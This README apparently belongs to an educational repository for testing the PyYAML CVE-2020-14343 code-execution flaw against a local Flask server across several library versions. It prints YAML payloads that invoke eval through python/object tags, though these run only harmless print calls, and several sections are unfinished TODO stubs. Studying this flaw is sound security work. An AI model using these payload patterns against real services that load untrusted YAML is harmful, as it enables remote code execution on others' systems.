=====================
pyyaml-CVE-2020-14343
=====================
Experimenting with the `CVE-2020-14343`_ vulnerability that affects the `PyYAML`_ library 
"where it is susceptible to arbitrary code execution when it processes untrusted YAML 
files through the ``full_load`` method or with the ``FullLoader`` loader." [BUG]_

`:warning:`

  **Disclaimer**

  This repository is for educational and informational purposes 
  only. The author, raul23, assumes no responsibility for the use 
  of this repository, code or any informaton contained therein. 
  The user is solely responsible for any action he/she takes with 
  this repository, code and information contained in it.

  Do not abuse this material. Be responsible.

.. contents:: **Contents**
   :depth: 4
   :local:
   :backlinks: top

Testing environment
===================
- **Execution platform:** macOS with `conda`_ (environment manager)
- **Python prerequisites:**

  - ``Python`` 3.7
  - `pyyaml`_: multiple versions of PyYAML were tested
  
    - ``pyyaml`` 3.13 (Jul 5, 2018) - vulnerable
    - ``pyyaml`` 5.1 (Mar 13, 2019) - vulnerable
    - ``pyyaml`` 5.3 (Jan 6, 2020) - vulnerable
    - ``pyyaml`` 5.4 (Jan 19, 2021) - not vulnerable
    
    `:information_source:`

      * The `CVE-2020-14343`_ vulnerability was fixed in PyYAML version 5.4 [BUG]_
      * The provided `server.py <#yaml-versions-option>`__ script uses 
        `conda`_ to create a virtual environment for each ``pyyaml`` version
      
  - `flask`_ (OPTIONAL): for building a simple server that will read a payload sent 
    as a ``yaml`` file containing the risky *yaml* syntax. If you don't have ``flask``, 
    then a simple web server implemented with built-in Python modules will be used.
    
    `:star:`
     
      The version choosen for ``flask`` is not that important. Just get the
      latest version (v1.1.2) or if you already had installed it, the version you 
      have should be good enough for the tests. What is important is the version of 
      ``pyyaml``

Code
====
The code used by the `experiments`_ consists in a simple Python `web server`_ and a 
client script for sending payloads (``yaml`` files):

.. code-block:: terminal

   server.py
   client.py
   payload01.yaml
   payload02.yaml
   payload03.yaml
   payload04.yaml

``server.py``
-------------
Description
"""""""""""
The Python web server is found in the `server.py`_ script which consists in two simple 
web servers:

1. Built-in web server: a web server implemented with built-in Python modules. 
   It is used if the user doesn't have the `flask`_ module installed
2. Flask web server

However, both servers share some common features such as:

- **input sanitation:** a basic regex ``^[\n --/-\]a-}]*$`` that checks the 
  input (``yaml`` payload) received by the client. The regex doesn't match 
  any string that has one of the following special characters:
  
  - ``.`` (Full stop; period)
  - ``^`` (Circumflex)
  - ``_`` (Underscore)
  - ````` (Backtick)
  - ``~``	(Tilde)
  
- 

`:information_source:`

  The flask server code is based from a note published @ hackmd.io by *harrier-lcc* [HAR]_

.. fixed: ^[\n --\/-\]a-}]*$

Options
"""""""
Get the options for the ``server.py`` script with the ``-h`` flag:

.. code-block:: terminal

   $ python server.py -h
   usage: server.py [-h] [-v {3.13,5.1,5.3,5.4}]

   TODO

   optional arguments:
     -h, --help            show this help message and exit
     -v {3.13,5.1,5.3,5.4}, --yaml-version {3.13,5.1,5.3,5.4}
                           TODO (default: None)

.. _yaml-versions-option:

TODO

``client.py``
-------------
Description
"""""""""""
The `client.py`_ script sends a payload as a ``yaml`` file to the listening 
`server.py <#server-py>`__. The payload contains risky ``yaml`` syntax that tries to exploit the
`CVE-2020-14343`_ vulnerability that affects PyYAML versions < 5.4 by making the
server execute remote code.

By default, `four payloads`_ are available but you can also customize your `own
payloads`_.

Options
"""""""
Get the options for the ``client.py`` script with the ``-h`` flag:

.. code-block:: bash

   $ python client.py -h

Payloads
""""""""
Default payloads
````````````````
A default payload is sent to the server as a ``yaml`` file with the ``-p`` option:

.. code-block:: bash

   $ python client.py -p 1

.. $ curl -F file=@payload{NUMBER}.txt http://0.0.0.0:8080
   
The payload sent to the server by ``client.py`` can be any of the following default 
``yaml`` files:

- ``-p 1``: **payload01.yaml**

  .. code-block:: yaml
  
     !!python/object/new:tuple 
     - !!python/object/new:map 
       - !!python/name:eval
       - [ print('RCE EXPLOIT!') ]
       
- ``-p 2``: **payload02.yaml**

  .. code-block:: yaml
  
     !!python/object/new:tuple 
     - !!python/object/new:map 
       - !!python/name:eval
       - [ print('invalid_syntax') ]
       
- ``-p 3``: **payload03.yaml**

  .. code-block:: yaml
  
     !!python/object/new:tuple 
     - !!python/object/new:map 
       - !!python/name:eval
       - [ print('TODO') ]
       
- ``-p 4``: **payload04.yaml**

  .. code-block:: yaml
  
     !!python/object/new:tuple 
     - !!python/object/new:map 
       - !!python/name:eval
       - [ print('TODO') ]

`:information_source:`

  The payloads are based from a note published @ hackmd.io by *harrier-lcc* [HAR]_

Custom payloads
```````````````
You can also specify your own payload with the ``-c`` option:

.. code-block:: bash

   $ python client.py -c my_payload.yaml
   
where **my_payload.yaml** contains the following:

.. code-block:: yaml

   !!python/object/new:tuple 
   - !!python/object/new:map 
     - !!python/name:eval
     - [ print('my payload') ]

How to use the scripts
----------------------
Run the web server
""""""""""""""""""
Run the server in a terminal using a specific PyYAML version:

.. code-block:: bash

   $ python server.py -v 3.13

**Output:**
  
.. code-block:: terminal

   * Conda env: yaml313
   * PyYAML version: 3.13
   * Serving Flask app "server" (lazy loading)
   * Environment: production
     WARNING: This is a development server. Do not use it in a production deployment.
     Use a production WSGI server instead.
   * Debug mode: off
   * Running on http://0.0.0.0:8080/ (Press CTRL+C to quit)
  
`:information_source:`

  The server will use the 3.13 PyYAML version which is vulnerable to
  a RCE exploit.

Send the payload
""""""""""""""""
You can send your payload (``yaml`` file) to the `listening server`_ with:

.. code-block:: bash

   $ python client.py -p 1

.. $ curl -F file=@payload01.txt http://0.0.0.0:8080

The web server will output among other things:

.. code-block:: terminal

   Loading yaml file...
   RCE EXPLOIT!

Experiments
===========
The following experiments consist in running a `simple
web server`_ that will read a payload sent
via the ``curl`` command. Also, each experiment is
associated to a specific version of ``pyyaml``.

Experiment 1: ``pyyaml`` 3.13
-----------------------------
Experiment 2: ``pyyaml`` 5.1
----------------------------
Experiment 3: ``pyyaml`` 5.3
----------------------------
Experiment 4: ``pyyaml`` 5.4
----------------------------

.. 
 Part II: More experiments
 =========================
 The following experiments consist in testing only ``pyyaml`` version 5.3 which 
 is affected by `CVE-2020-14343`_. The code used for each of the following experiments
 is different unlike the experiments in Part I which all share a common code (server and
 payloads).

References
==========
.. [BUG] “Bug 1860466 – (CVE-2020-14343) CVE-2020-14343 PyYAML: Incomplete Fix for CVE-2020-1747.” 
   *Redhat.Com*, https://bugzilla.redhat.com/show_bug.cgi?id=1860466. Accessed 30 June 2021.

.. [HAR] “Uiuctf 2020 - HackMD.” *Hackmd.Io*, https://hackmd.io/@harrier/uiuctf20. 
   Accessed 30 June 2021.

.. URLs
.. _conda: https://docs.conda.io/projects/conda/en/latest/user-guide/getting-started.html
.. _CVE-2020-14343: https://access.redhat.com/security/cve/cve-2020-14343
.. _flask: https://flask.palletsprojects.com/
.. _pyyaml: https://pypi.org/project/PyYAML/

.. URLs within project
.. _server.py: ./README.rst

.. URLs internal
.. _experiments: #experiments
.. _four payloads: #default-payloads
.. _listening server: #run-the-web-server
.. _own payload: #custom-payloads
.. _payloads: #payloads
.. _simple web server: #web-server
.. _web server: #server-py
